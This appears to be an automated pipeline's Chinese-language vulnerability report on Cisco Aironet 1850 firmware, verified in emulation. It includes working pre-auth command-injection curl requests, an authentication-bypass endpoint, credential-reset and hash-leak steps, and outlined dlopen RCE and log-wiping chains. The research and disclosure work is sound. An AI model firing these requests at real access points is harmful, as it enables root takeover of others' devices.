# 最终结论报告 — Cisco Aironet 1850 (AIR-AP1850-K9) Mobility Express 8.10.130.0

> Run：iot-hunter / 20260917-041115 ｜ finalizer ｜ 综合静态审计（`artifacts/report.md`，4 工单反汇编级）与动态验证（FirmAE 改造形态 full-system 仿真 192.168.100.1，4 个 verify 节点 / 7 条主张）产出。动静结论冲突时以动态为准，置信度忠实转述、不升级；证据等级按 rehost fidelity 分级标注（本 run ap1g4 为 full-system）。

---

## 1. 最终结论一览

**6 实证 / 1 证伪 / 13 无法验证**（候选清单 20 条，其中 7 条出 PoC 工单、13 条因环境能力/裁剪未验）。

一句话风险定性：**Web 管理面完全失守**——三条互相独立、单请求、pre-auth 的 root RCE（VULN-1 webauth.json `clientid`、VULN-2 set_universal `location`、VULN-3 wl_maclist 经 VULN-4）全部执行级实证，叠加通用认证绕过原语（VULN-4，22 个认证后 handler 无认证执行）、无认证凭据重置写入（VULN-9）与凭据哈希外泄（VULN-10，认证路径）——仅需 80/443/1233/1234 任一端口可达、无需任何凭据即可获得整机 root 权限；唯一被动态证伪的是 tar 穿越持久化向量（VULN-5，busybox tar 提取期 sanitize），**不影响任何一条 RCE 主链**。

| 漏洞 | 静态结论（report.md） | 动态结果 | 最终定性 | 证据等级 |
|---|---|---|---|---|
| VULN-1 webauth.json `clientid` 注入（pre-auth RCE） | Critical / 确认 | [poc-success] | **实证：pre-auth 单 GET root 命令执行** | 执行级实证（整机仿真） |
| VULN-2 set_universal_ap_reg_domain `location` 注入（pre-auth RCE） | Critical / 确认 | [poc-success] | **实证：pre-auth 单 GET root 命令执行（2g/5g 双 sink）** | 执行级实证（整机仿真） |
| VULN-3 config_set_ssid `wl_maclist%d` 注入 | Critical / 确认 | [poc-success] | **实证：pre-auth（经 VULN-4）+ post-auth 双路径；新增存储型二阶注入** | 执行级实证（整机仿真） |
| VULN-4 testfastcgi 全分发表遍历（认证绕过原语） | Critical / 确认 | [poc-success] | **实证：无认证触发 22 个认证后 handler** | 执行级实证（整机仿真） |
| VULN-9 resetlogin 无认证凭据重置 | High / 确认（写入动作） | [poc-success]（登录效果 blocked-环境差异） | **实证（限写入动作）；登录效果环境不可判** | 执行级实证（整机仿真，限写入动作） |
| VULN-10 firmwaredownload 配置/凭据哈希泄露 | High / 确认（sink） | [poc-success] | **实证（限认证路径取回）；无认证取回未直接实证** | 执行级实证（整机仿真，限认证路径） |
| VULN-5 firmwareupload tar 穿越任意写 | High / 高度可疑→确认 | [poc-fail] | **证伪（本固件 tar 穿越向量）；上传原语本身实证可用** | 执行级证伪（整机仿真） |
| VULN-14 wl_unit sprintf 溢出（DoS） | Medium / 确认（crash） | 未验证（主动裁剪） | 维持静态确认（crash/DoS） | 静态结论（未经动态验证） |
| VULN-12 stilecpd :4040 零认证 RPC（21 命令） | High / 确认 | 未验证（服务未启动） | 维持静态确认 | 静态结论（未经动态验证） |
| VULN-13 stilecpd unload+load → dlopen RCE | Critical / 高（静态确认） | 未验证（服务未启动） | 维持静态确认 | 静态结论（未经动态验证） |
| VULN-11 capwapd TLV 0xf4 → popen 注入 | High / sink 确认、可达性推测 | 未验证（capwapd 未运行 + wcpd 缺环） | 维持 sink 确认、可达性推测 | 静态结论（未经动态验证） |
| VULN-15/16 stilecpd 文件 oracle / 外联配置 | Medium / 高度可疑 | 未验证（服务未启动） | 维持高度可疑 | 静态结论（未经动态验证） |
| VULN-17/18 capwapd 版本串 system×3 / DTLS 宽松 | Medium | 未验证（同 VULN-11 缺环） | 维持静态判定 | 静态结论（未经动态验证） |
| VULN-6 wcpd/click 消费面（redirecturl 二阶） | High（若闭合）/ 推测 | 未验证（审计缺环 + /click 为 stub） | 维持推测 | 静态结论（未经动态验证） |
| VULN-19/20/22 sshd 空口令 / tftpd 上传 / memcached | Medium / 配置事实确认 | 未验证（服务未启动） | 维持配置事实确认 | 静态结论（未经动态验证） |
| VULN-21 redis 硬编码口令（loopback） | Low / 配置事实确认 | 未验证（无远程可验面） | 维持配置事实确认 | 静态结论（未经动态验证） |
| /configure/ 前缀归一化绕过（上轮静态遗留，未编号） | 待动态判定 | 三探针全 401 | **证伪：该形态安全（lighttpd 1.4.54 本 rehost 实测）** | 执行级证伪（整机仿真） |

---

## 2. 实证漏洞（6 条）

> 取证通道统一说明：仿真环境 wcp_write 为 shell 回显 stub（逐参数 WCPW_ARGn 回显到 /dev/console），但**注入 sink 是 run_system/system → /bin/sh 本体路径，未被 stub**——注入命令以 root 在 guest 内真实执行，判据为命令向 /dev/console 写入 marker 后在宿主侧 serial log（/tmp/ser34.log）命中。以下行号均为 ser34.log 实际行号，可复核。

### 2.1 VULN-1 — /webauth/webauth.json `clientid` 无认证命令注入 → root RCE

**证据等级：执行级实证（整机仿真）** ｜ 工单 verify-1

- **动态证据**：
  - 基线：`curl -sk 'https://192.168.100.1/webauth/webauth.json?clientid=1&redirecturl=x'` → **200** `{"originalurl":"x","authorized":true}`（pre-auth 可达）；同刻 `GET /oeap/home.json` 无凭据 → **401**（认证边界生效，401 是真实拒绝）。
  - 主判据：`clientid=%3Becho%20VULN1_RCE_OK%20%3E/dev/console%3B`（解码 `;echo VULN1_RCE_OK >/dev/console;`）→ 200；serial 行 35404–35408 三段互证：`WCPW_ARG0: [wcp/wcp_db.set_webauth_done_to_fcgi]`（run_system@0x10b98 到达且带固定前缀）→ **`VULN1_RCE_OK`**（注入 echo 以 root 执行）→ `/bin/sh: 1: not found`（sbuild 格式串尾部常量 ` 1` 被当独立命令）——完整命令 `wcp_write wcp/wcp_db.set_webauth_done_to_fcgi ;echo VULN1_RCE_OK >/dev/console; 1` 每一分段留痕，payload 原样进 shell、无过滤无转义。
  - 分支语义：同款注入 + `username=admin` → 200 但 `{"status":"ERROR"}`（登录分支），无 marker——非空 username 不经 passthru sink，与静态 [sp+48]==0 判空 @0x10b44 一致。
  - 负对照：webauth_result.json 同款注入 → 200（HTML），`VULN1_NEGCTL` **零命中**——注入效果特定于本端点，与 audit-0 静态负对照互证。
  - 加固变体：clientid 全十六进制 URL 编码 → `VULN1_RCE_OK_V2` 命中（行 37490），编码不构成防御。
- **静态证据出处**：report.md §2 VULN-1（[audit-0] major④：handler 0x10ab0，sink run_system@0x10b98，`"wcp_write wcp/wcp_db.set_webauth_done_to_fcgi %s 1"` @0x1d328）。
- **实际影响评估**：强制门户端点（:443/:1233/:1234，设计上登录前可达）**单 GET、无任何凭据、无前置状态**即 root 命令执行；fastcgi 以 root 运行，system() 继承——影响面整机。

### 2.2 VULN-2 — /set_universal_ap_reg_domain.shtml `location` 无认证命令注入 → root RCE

**证据等级：执行级实证（整机仿真）** ｜ 工单 verify-0

- **动态证据**：
  - 对照组（无元字符）：`location=SAFELOC123` → 200 `System primed to Regulatory Domains...Rebooting now`，serial 回显 `WCPW_ARG0: [wcp/dot11_tx_power_2g.set_domain]` → `WCPW_ARG1: [1]` → **`WCPW_ARG2: [SAFELOC123]`**（2g/5g 各一次，行 35222–35228）——参数原样进入 shell 命令行且环境不凭空执行内容；无任何 VULN2_ marker。
  - 注入组（主判据）：`location=X%3Becho%20VULN2_RCE_OK%20%3E/dev/console%3B` → 200，`VULN2_RCE_OK` **命中 ×2**（行 36029/36033），上下文 `WCPW_ARG2: [X]` 紧跟 marker——shell 在 `;` 处切分后 wcp_write 只收到 `X`，注入 echo 以 root 独立执行，对应 2g/5g 两条 system()（0x9ce8/0x9d24）各一次。
  - 加固变体：全十六进制编码 → `VULN2_RCE_OK_V2` 命中 ×2（行 36774/36778）。
  - 认证边界佐证：/oeap/home.json 无凭据 401 / Cisco:Cisco 200——auth.require 真实生效，本端点在边界外全程无凭据 200。
- **静态证据出处**：report.md §2 VULN-2（[audit-0] major① + [audit-1] chain：handler 0x99bc，sink `snprintf(sp+272,128,"wcp_write ...set_domain %d %s %s %s")` @0x9ce0 → `system` @0x9ce8/0x9d24）。
- **实际影响评估**：pre-auth 单 GET root 命令执行，整机影响；payload 空间约 76–80 字节（128B 命令缓冲 − 47–50B 固定前缀），实测 34B payload 双 sink 各执行一次。每次命中应用路径触发 `/sbin/reboot -r`（0x9e50），payload 先于 reboot 完成。
- **本轮修正（动态+反汇编复核）**：①参数名实证为 `configMode/location/regDomain5/regDomain24`（往期 "unit=" 记录有误）；②**regDomain 辅助向量降级**：strncpy 写 sp+24/sp+20 但 snprintf 读 sp+25/sp+21（off-by-one），实际可注入内容仅为值的第 2–3 字符——静态 "≤2 字符元字符" 的表述修正，location 为主向量结论不变。

### 2.3 VULN-3 — config_set_ssid.cgi `wl_maclist%d` 命令注入（pre-auth/post-auth 双路径 + 存储型二阶）

**证据等级：执行级实证（整机仿真）** ｜ 工单 verify-2

- **动态证据**：
  - pre-auth（经 VULN-4 遍历）：无凭据 `curl -sk -X POST https://192.168.100.1/testfastcgi.cgi --data 'wl_unit=1&wl_macmode=allow&wl_maclist0=%3Becho%20VULN3_RCE_OK%20%3E/dev/console%3B'` → **200**，serial 行 35452–35456：`WCPW_ARG0: [wcp/Radio1.config_local_ssid_acl]`（gate 通过）→ `[wcp/Radio1.add_local_ssid_acl_entry]`（sink 0x89e0）→ **`VULN3_RCE_OK`**（:35456）。
  - 双 sink 展示：换新值变体单请求因果验证（行 39355–39363）：`add_local_ssid_acl_entry` → `VULN3_RCE_OK2`，紧接 `delete_local_ssid_acl_entry` → `VULN3_RCE_OK`（旧值复燃）——**add（0x89e0）与 delete（0x8a4c）两个 sink 均可达**（审计报告只标了 add 主路径）。
  - 持久化证据：行 35908 `V10_CFG` 回显 `/storage/config.oeap` 内容含 `wl_maclist0_1 ;echo VULN3_RCE_OK >/dev/console;`——**注入值落盘，构成存储型注入**：后续任意 ACL 同步经 delete sink 复燃历史值。
  - post-auth（直达）：`curl -sk -u Cisco:Cisco -X POST .../oeap/config_set_ssid.cgi` 同参数 → 307（正常重定向 ssid.cgi），serial 43477+：add sink → `VULN3_AUTH_OK` + delete sink → `VULN3_RCE_OK2`（存储值复燃）——认证路径独立实证。
- **静态证据出处**：report.md §2 VULN-3（[audit-0] major③：handler 0x8ab8，gate 0x96b8–0x96c8，sinks 0x89e0/0x8a4c `%s` 无过滤无引号）。
- **实际影响评估**：比单次 RCE 更高一档——除双路径注入外，payload 持久化于 /storage/config.oeap，设备重启后仍存（存储型），后续任何触发 ACL 同步的请求（含管理员正常操作）都会经 delete sink 重新执行历史 payload。附带机制：ACL 同步为按值 diff 语义（add=POST−存储、delete=存储−POST，反汇编 5bc4 差集函数实证）——重复提交同值不再触发 sink，换新值触发且旧值复燃。

### 2.4 VULN-4 — /testfastcgi.cgi 全分发表遍历 = 通用认证绕过原语

**证据等级：执行级实证（整机仿真）** ｜ 工单 verify-2

- **动态证据**：
  - 无凭据 `POST /testfastcgi.cgi`（body 携带 VULN-3 payload）→ **200**（非 401），单请求窗口内 serial 出现 /oeap/ 门控 handler config_set_ssid 的完整执行痕迹 + `VULN3_RCE_OK`（:35456）——认证后 handler 经遍历无认证执行。
  - 遍历广度（一次无认证请求的 serial 窗口 38410–38520）：同请求还执行了 **firmwaredownload[27]**（`mkdir -p /tmp/download_config` → `cp /storage/base_capwap_cfg_info …;cp /storage/config.* …;tar -cvf …` 固定命令链全文回显，tar 列出 config.oeap 等成员）与 **firmwareupload[28]**（`rm -rf /tmp/upload_config` 无害早退）、postlogin 族（读 /COOKIE_PID）——跳过项（webauth*/config_set_radio/dhcp/firewall）与 audit-0 分发表 flag bit0 分析完全一致。
  - 基线：无凭据 GET /oeap/home.json → 401 vs 无凭据 /testfastcgi.cgi → 200（认证边界生效但保护不了本端点）。
- **静态证据出处**：report.md §2 VULN-4（[audit-0] major②：handler 0xa05c，遍历循环 0xa114–0xa130，分发表 0x31014–0x311f4，跳过恰 6 项、执行 22 项）。
- **实际影响评估**：**22 个认证后 handler 全部无认证可达**（含 resetlogin 凭据重置→VULN-9、firmwareupload 上传→VULN-5 原语、firmwaredownload 下载→VULN-10、evt_log_clear 日志擦除、config_set_ssid 注入→VULN-3）——它本身是"原语"漏洞：任何后续加入 /oeap/ 的 handler 自动继承此旁路。
- **附带闭环**：/configure/ 前缀归一化绕过（上轮静态遗留）：三探针 `/configure/../oeap/home.json`、`/configure/%2e%2e/oeap/home.json`、`/oeap/../configure/../oeap/home.json`（均无凭据 `--path-as-is`）→ **全部 401**——lighttpd 1.4.54 无此绕过形态，该项以"安全"关账。

### 2.5 VULN-9 — resetlogin.json 无认证凭据重置（限写入动作）

**证据等级：执行级实证（整机仿真，限写入动作）；登录效果环境不可判** ｜ 工单 verify-3

- **动态证据**（mtime 前后对比法 + 内容确认，双周期复现）：
  - 周期 1：基线注入测得 `/etc/lighttpd-htpasswd.user` mtime 08:21（guest 刚重启，fastcgi 启动初始化写入）→ 无凭据 `curl -sk -X POST https://192.168.100.1/testfastcgi.cgi --data 'x=1'`（08:22:38）→ 复测 mtime **08:22**（= 请求时刻）+ 内容 `admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`（= `admin:sha256("admin")`，71B）。
  - 窗口排除重启混淆：两测点间 serial 无 Booting/preInit 标记、服务连续在线（两次请求均 200 首发成功）、且同窗口捕获遍历执行痕迹（firmwaredownload/firmwareupload 命令链回显）——mtime 前进由 resetlogin 写入 causally 解释。
  - 周期 2（08:25 基线 → 触发 → mtime 前进 + 内容不变，无重启）复现一致。
- **静态证据出处**：report.md §2 VULN-9（[audit-0] major⑤：handler 0xa930 → 0x5c54 链 ssl_encrypt("admin","SHA256") → write_to_file_rename_atomic("/etc/lighttpd-htpasswd.user") @0x5d14）。
- **实际影响评估**：无认证单请求将管理凭据文件重写为已知默认值（admin/admin）——**写入动作执行级实证**。登录效果在本环境不可判：L3-修复 7 使仿真 lighttpd 认证读独立 `.rehost` 文件，resetlogin 写 `.user` 文件，二者解耦（环境差异，非固件行为）。真机上静态张力仍在：lighttpd 1.4.54 htpasswd 后端不认裸 sha256 → 后果可能是 (a) webauth 层凭据状态重置可登录，或 (b) Basic auth 锁死（认证 DoS）——**两种后果均为未授权安全事件**，表述不得宣称 "admin/admin 可登录"。

### 2.6 VULN-10 — firmwaredownload.cgi 配置/凭据哈希外泄（限认证路径取回）

**证据等级：执行级实证（整机仿真，限认证路径取回）；无认证取回未直接实证** ｜ 工单 verify-3

- **动态证据**：
  - `curl -sk -u Cisco:Cisco -X POST 'https://192.168.100.1/oeap/firmwaredownload.cgi' -d ''` → **200，4608B**；`file` = POSIX tar (GNU)；`tar -tvf` 成员：config.flex / **config.oeap(157B)** / config.oeap.tmp_29809 / config.wireless / oeap_info；解包 `cat config.oeap` = **`system_password 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`**（宿主 `echo -n admin|sha256sum` 比对一致 = sha256("admin")）+ slotId/wl_* 行——管理员凭据哈希材料经响应体带出。
  - 无认证维度：B2 无凭据 POST /testfastcgi.cgi 的 serial 窗口实证 firmwaredownload 固定命令全序执行（mkdir → cp → tar -cvf → rm）= handler 经遍历无认证执行成立、材料在服务端打包；但遍历复合应答被后续 handler 覆写（112B "success?" HTML）——**无认证响应体直接取回未获证据**。
  - 环境限制：/storage/base_capwap_cfg_info 在本环境不存在（该文件的部分泄露主张对环境默认态不适用）。
- **静态证据出处**：report.md §2 VULN-10（[audit-0] major②④：固定命令 `cp /storage/base_capwap_cfg_info …;cp /storage/config.* …;tar -cvf …` @0x1be58，sinks 0x6d34/0x6d84/0x6e34）。
- **实际影响评估**：认证后单请求直接取回含凭据哈希的配置包（哈希为无盐 sha256，弱口令可离线彩虹表恢复）；无认证经 VULN-4 遍历可达 handler（执行实证），响应体取回依赖遍历应答覆写机制的实现细节，未直接实证——按实证边界如实表述。
- **附带修正**：静态/poc-planner 工单的"分段构造体（build 段+deflate 段）"假设证误——响应体即纯 tar，build info 以 tar 成员 oeap_info 形式包含。

---

## 3. 证伪 / 降级项

### 3.1 VULN-5 — tar `../` 成员路径穿越任意文件写：**执行级证伪（整机仿真）**

- **静态主张**（report.md §2 VULN-5，[audit-1] chain）：firmwareupload.cgi multipart → /tmp/upload_config/uploaded_config_file.tar → `run_system("cd /tmp/upload_config;tar -xvf …")` @0x8068 → GNU tar `../` 成员 = 任意路径写 → W3 持久化链（写 /www/x.sh + cgi.assign → GET /x.sh）。
- **动态判定**（verify-3）：代码路径本身动态确认（认证入口 POST /oeap/firmwareupload.cgi → 307 → serial 完整执行 mkdir/tar -xvf/rm；pre-auth 入口 POST /testfastcgi.cgi 同样完整执行），但 **`/bin/tar` 为 BusyBox v1.29.3，提取期 sanitize 禁闭全部穿越编码**：
  - `../../www/v5authpoc.sh` → `tar: removing leading '../../' from member names`，剥前导后以 cwd 相对路径解包 → 落点 /tmp/upload_config/www/（随即被 handler rm）；
  - 变体穷尽：`../v5b.sh`、`../../../www/v5f.sh`（任意深度）、`tmpa/../../../www/v5a.sh`（被抵消前缀含实目录）、`/www/v5d.sh`（绝对路径）、`./../../www/v5e.sh` → **全 strip**；symlink 成员（绝对目标 /www、相对目标 ../../www）→ **一律拒绝**（`tar: can't create symlink 'r1' to '../../www'`）；
  - 落点核查：`ls /www/v5*.sh` → 无；`GET /v5authpoc.sh` → 400（本环境缺失文件行为）——W3 链两入口均未达成。
  - **两个对照实验排除仿真伪影**：guest 直接 `ln -s ../../www /tmp/v5ctl_link` 成功（symlink(2) 可用，拒绝为 tar 自身提取期检查，即真实固件行为）；`touch /www/v5wtest` 成功（/www 可写，禁闭非只读 fs 所致）。
- **最终定性**：**"tar `../` 成员 = 任意路径写"对本固件不成立；W3 持久化链经此向量不可达**（细化机制：非"拒绝成员"，而是"strip 前缀后相对 cwd 解包 + symlink 拒绝"）。**上传原语本身（multipart 解析 → tar 落盘 → tar -xvf）认证/pre-auth 两入口均实证可用**——该原语对 W4 链（config.oeap 投毒）仍是活向量。
- **审计质量反馈**：静态分析假设了 GNU tar 穿越语义，实际固件 tar 为 busybox v1.29.3（自带提取期安全检查）——**"运行时组件身份"（哪个 tar、哪个 shell、哪个 libc）应作为静态审计的前置核查项**，此类组合语义主张（依赖外部工具行为）天然需要动态裁定。

### 3.2 降级与修正（不改变主结论）

| 项 | 原表述 | 修正后 | 依据 |
|---|---|---|---|
| VULN-2 regDomain 辅助向量 | "strncpy(3) 仅能注入 ≤2 字符元字符" | 实际可注入内容仅为值的**第 2–3 字符**（strncpy 写 sp+24/sp+20、snprintf 读 sp+25/sp+21，off-by-one；1 字符值贡献空串、2 字符值仅第 2 字符入命令） | verify-0 反汇编复核 + 历史 ser32 回显互证 |
| VULN-2 参数名 | 往期 findings 记 "unit=" | `configMode(int)/location/regDomain5/regDomain24`（strncmp 长度 10/8/10/11，literal @0x1c589–0x1c5a8） | verify-0 literal pool 直读 |
| VULN-10 应答形态 | "分段构造体（build 段 + deflate 段）" | 响应体即纯 tar（4608B），build info 为成员 oeap_info | verify-3 解包实证 |
| firmwareupload 畸形 body | audit-1 minor："仅 1 个 '\n' → abort() 崩溃 DoS" | 适用范围收窄：无 '\n' body → 无害早退（rm 后返回）；**恰 1–2 个 '\n'** 才 __assert abort | poc-planner 反汇编复核 + verify-3 serial 实测（普通表单 POST 安全早退） |
| /configure/ 前缀绕过 | 静态不可判定（上轮遗留） | **安全**（三形态探针全 401） | verify-2 执行级实测 |

### 3.3 对审计质量的正面反馈（方法论交叉验证）

- **分发表 flag 分析与动态行为精确吻合**：audit-0 静态解码的 28 项分发表 flag bit0 跳过清单（6 项）与 verify-2 实测遍历窗口（执行 config_set_ssid[19]/firmwaredownload[27]/firmwareupload[28]/postlogin 族、跳过 webauth*/radio/dhcp/firewall，表序一致）**逐项对上**——静态 URI 表分析方法得到执行级交叉验证。
- **分支语义吻合**：webauth.json 空/非空 username 分支（静态 [sp+48]==0 @0x10b44）与动态两分支不同响应体 + 仅 passthru 分支留痕完全一致；webauth_result.json 静态负对照（无 shell sink）与动态零命中互证。
- **证伪纪律有效**：本轮唯一证伪（VULN-5）源自静态未核查外部工具身份，而非数据流分析错误——4 个工单的全部反汇编级数据流结论（sink 地址、参数流、gate 条件）无一被动态推翻。

---

## 4. 无法验证项（13 条）

> 缺什么前置、后续若具备如何验证。全部维持静态结论（未经动态验证），置信度不升级。

### 4.1 环境未启动服务（rehost 最小 boot 只起 web 栈：22/69/4040/5246/11111/64999 关闭）

| 漏洞 | 缺失前置 | 后续验证方法 |
|---|---|---|
| VULN-12 stilecpd :4040 零认证 RPC | nbar.service 未启动 | guest 内拉起 `/usr/bin/stilecpd --mode km --activate -s 0.0.0.0:4040`（或 systemctl start nbar）→ `echo '{"jsonrpc":"2.0","method":"status","id":1}' \| nc <ip> 4040` 验证零认证应答；shutdown/DoS×2/log 同法 |
| VULN-13 stilecpd dlopen RCE | 同上 + tftpd | 拉起 nbar + tftpd-hpa → `tftp <ip> -c put libntcp_k.so` → nc 4040 发 `unload` + `load {"path":"/tftpboot"}` → 观察 dlopen（构造函数执行痕迹） |
| VULN-15/16 push_pcap oracle / exporter 外联 | nbar.service 未启动 | 拉起后 push_pcap filename 指向 /etc/passwd 观察错误差异（oracle）；collect set_exporter 指向攻击者监听端口观察外联 |
| VULN-19 sshd 空口令 | sshd 未运行 | guest 内起 sshd → 无口令尝试 support/rsyncuser 登录（passwd 无 shadow，运行期口令状态未知） |
| VULN-20 tftpd-hpa 上传 | tftpd 未运行 | 拉起后 `tftp <ip> -c put test`（-C /tftpboot 上传面） |
| VULN-22 memcached 1.5.7 | memcached 未运行；另缺外部 CVE 检索 | 拉起后版本/协议探测；CVE 核对属 OSINT 工单（correlator 已按角色约束未做） |

### 4.2 capwapd 栈（VULN-11/17/18）

- 缺失前置：①capwapd 在 rehost 中未运行（最小 boot）；②**关键审计缺环——wcpd 如何产生内部 TLV 0xf4 未审计**（决定 FLEX_SLAVE_DOWNLOAD 注入链的远程可达性）。
- 后续：先补 wcpd 审计工单（本 run 最高投入产出比缺口），再在 guest 拉起 capwapd/wcpd 栈，经 /tmp/capwap_wcp_msg 构造 TLV 0xf4 验证 0xf6f80 strncpy → 0x61074 popen 链；VULN-17 版本串三 sink、VULN-18 DTLS 策略位同栈验证（DTLS 明文 Join 接受性需协议级交互）。

### 4.3 审计缺环（VULN-6）与主动裁剪（VULN-14）、无远程面（VULN-21）

- **VULN-6（redirecturl → click webauth_helper 二阶注入）**：缺环在 wcpd/click 侧（未审计），且 rehost /click 为**静态 stub 树**（无真机 click 运行态语义）——即使补动态也只验 stub 行为，需 wcpd/click 审计 + 真机/高保真环境。
- **VULN-14（wl_unit sprintf 溢出 crash/DoS）**：主动裁剪（4 工单上限让位 RCE 链，且 crash 会干扰并行 verify）。静态已确认 crash（0x887c sprintf 溢出 10 字节 → 0x8888 HashMap wild pointer SIGSEGV）；后续单独跑：`POST config_set_ssid.cgi wl_unit=1&wl_macmode=allow` → `wl_unit=2147483647`，观察 fastcgi 崩溃与进程模型影响面。
- **VULN-21（redis 硬编码口令）**：loopback 绑定，无独立远程可验面——需先获得本地执行/SSRF 原语（任一 RCE 即可借力）。

### 4.4 ap1g1（IOS 15.3(3)JK3，附带平台）零覆盖

本轮审计链裁剪（planner 决策），无待验清单；unicorn 函数级 harness 契约已就绪（mips-be 勘误、基址 0x80080000、kseg0 物理别名已处理，`agents/rehoster/unicorn_harness_fixed.py`），供后续轮次补审 httpd shtml 表单（image_upgrade_tftp_server_address 等）后使用。

---

## 5. 利用链终判

| 链 | 构成 | 终判 |
|---|---|---|
| **W1** Web 面三条独立 pre-auth root RCE | A：set_universal `location`（VULN-2）；B：testfastcgi→wl_maclist（VULN-4→VULN-3）；C：webauth.json `clientid`（VULN-1） | **成立——三入口全部执行级实证（整机仿真）**，互相独立、均单请求、均无认证、均 root。持久化共用出口（payload 写 /www/x.sh + cgi.assign(".sh"=>"/bin/sh")）未端到端串测，但其要素分立成立：注入命令本身以 root 运行可直接写文件（/www 可写已经 guest touch 实证）、cgi.assign 静态确认（lighttpd.conf L78-80）——持久化可行性高，仅"GET /x.sh 二次触发"未演示 |
| **W2** 凭据重置→管理面全权 | VULN-4 → resetlogin（VULN-9）→ admin/admin → /oeap/+/configure/ 全族 | **部分成立**：无认证写入动作执行级实证（凭据文件重写为 admin:sha256(admin)，双周期复现）；**后续登录效果未定**——本环境 lighttpd 认证与 .user 文件解耦（L3-修复 7）不可判；真机上"默认凭据可登录"与"Basic auth 锁死（认证 DoS）"两种后果均为安全事件 |
| **W3** tar 穿越→持久化 RCE | VULN-4 → firmwareupload tar 穿越（VULN-5）→ 写 /www/x.sh → GET /x.sh | **证伪（经此向量不可达）**：busybox tar v1.29.3 提取期 sanitize 禁闭全部穿越形态于 /tmp/upload_config（handler 即时 rm）。替代持久化出口不受影响（S1 的 dlopen 链、W1 注入命令直接写文件） |
| **W4** 配置投毒→时间转移注入 | 上传 tar 内 config.oeap → save /storage/config.oeap → 下次 ACL 同步 delete sink 注入 | **组件分别实证、端到端未串测**：第一阶段（上传原语 + handler 读存 /storage）静态确认且上传原语两入口执行级实证（工单为避免 guest 重启刻意未含 config.oeap 成员）；第二阶段（存储值 → delete sink 注入）已经 VULN-3 二阶复燃**执行级实证**（行 39363/43477+，存储 payload 经 delete_local_ssid_acl_entry 重新执行）。链成立度高，缺的只是把两段在一次 PoC 里串起来 |
| **S1** 服务面 root RCE | tftpd :69 上传 .so（VULN-20）→ stilecpd :4040 unload+load → dlopen（VULN-12→VULN-13） | **未验证（环境未启动两服务）；静态确认**（dlopen 数据流反汇编级实证：load_so@0x66860 `path.append("/libntcp_k.so")` → dlopen@0x668d8，validate_path 仅 stat+S_ISDIR 无白名单）。不受 VULN-5 证伪影响 |
| **C1** 跨 binary 条件链 | fastcgi 配置字符串 → send_ipc_to_capwap → wcpd → TLV 0xf4 → capwapd popen（VULN-11） | **维持待验证**：两段证据均实证（fastcgi 侧 send_ipc、capwapd 侧 sink 链），连接段（wcpd 转换）未审计——下一审计工单首选 wcpd |
| **R1** redirecturl 二阶注入 | redirect.cgi → click webauth_helper 元素 → wcpd/click 消费（VULN-6） | **维持推测**：fastcgi 侧数据流已证（无 shell sink），消费端未审计 + /click 为 stub，需审计 + 高保真环境 |
| **反取证组合** | VULN-4 → evt_log_clear 清 /var/log/messages + stilecpd log 调级静默 | **未直接实证，维持静态结论**：evt_log_clear 经遍历执行但清空动作无可辨识 serial 痕迹（verify-2 附注）；stilecpd 未启动。注意 VULN-4 遍历本身已实证（执行级），仅该副作用未单独取证 |

---

## 6. 环境说明

### 6.1 rehost ap1g4（主要验证环境）：full-system，成功

- **形态**：FirmAE 改造形态——host QEMU 8.2.2 直跑 vexpress-a9 -m 1024，自编 Linux 3.4.103 FirmAE 补丁内核（vermagic 与固件 28 个 .ko 逐字节匹配），产物 /tmp/zImage.armel + /tmp/orig.dtb + FirmAE scratch/300/image.raw（含全部 L3 修补）。复用 runs/20260915-095054 第三轮终态产物，本轮新增 L3-修复 7（Basic auth 根因：fastcgi 启动覆写 /etc/lighttpd-htpasswd.user 为裸 sha256 格式而 lighttpd 1.4.54 不认——改读独立 .rehost 文件，Cisco/Cisco → 200；该修复同时使 post-auth /oeap/*.cgi 全族首次可动态验证）。
- **在线状态**：192.168.100.1，lighttpd/1.4.54 https:443（:80 301→443），fastcgi 经 /run/fcgi_sock 全端点命中；80/443/1233/1234 开放，22/4040/11111/64999 关闭（最小 boot 只起 web 栈）。报告产出时刻复测：webauth.json pre-auth 200、/oeap/ 无凭据 401——环境仍在线、认证边界仍生效。
- **取证通道**：serial log `/tmp/ser34.log`（wcp_write stub 逐参数 WCPW_ARGn 回显 + guest /bin/sh 报错同日志可见）；计时型 PoC 不可靠（guest 无 sleep/id），一切判定以 serial 命令执行痕迹为准。本轮全部 marker 已复核在卷（VULN1_RCE_OK×2、VULN2_RCE_OK×4、VULN3_RCE_OK×5、VULN3_AUTH_OK×2、SAFELOC123×2、负对照 VULN1_NEGCTL×0）。
- **能力边界（影响结论适用范围）**：可验证 web 网络可达 PoC（pre-auth + post-auth 全端点）与 fastcgi 完整数据流（含 system() 注入执行级取证）；**不可验证**：非 web 服务（未启动）、内核模块行为（merakiclick.ko insmod Unknown symbol，Meraki 私有符号缺失）、真机 click/wcp 运行态语义（/click 为静态 stub 树，wcp_write/wcp_read 为 shell stub——但注入 sink 是 /bin/sh 本体路径，不受 stub 影响）。

### 6.2 PoC 覆盖与裁剪

- **覆盖**：7 条主张 / 4 工单（子 run 20260917-081629，verify-0..3 并行，08:16–08:47 全部完成）——VULN-1、VULN-2、VULN-4+VULN-3、VULN-5+VULN-9+VULN-10，全部落在 full-system 环境可验能力内；覆盖 W1 全部三入口与 W2/W3 两条组合链，另顺带闭环 /configure/ 前缀绕过遗留项。
- **裁剪及原因**（poc-planner 决策）：VULN-12/13/15/16（stilecpd:4040）、VULN-11/17/18（capwapd）、VULN-19（sshd）、VULN-20（tftpd:69）、VULN-22（memcached）——环境未启动对应服务（blocked-环境能力不足）；VULN-14（crash 让位 RCE 链 + 干扰并行验证）；VULN-6（缺环在审计侧非动态侧）；VULN-21（loopback 配置事实，无远程可验面）。

---

## 7. 附录：产物索引

| 产物 | 路径 |
|---|---|
| **本报告（最终结论）** | `workdir/artifacts/final-report.md` |
| 静态审计报告 | `workdir/artifacts/report.md` |
| correlator 候选漏洞清单（20 条 + 链总览） | `workdir/artifacts/vulns.md` |
| 全部发现记录（[unpacker]/[audit-0..3]/[verify-0..3] 条目，证据本体） | `runs/20260917-041115/memory/findings.md` |
| 流水线上下文 + rehost 环境契约 | `runs/20260917-041115/memory/context.md` |
| 决策记录（planner 选单 / rehoster backend+L3 修复 / correlator 拼链 / poc-planner 工单） | `runs/20260917-041115/memory/decisions.md` |
| 攻击面地图 | `runs/20260917-041115/memory/surface.md` |
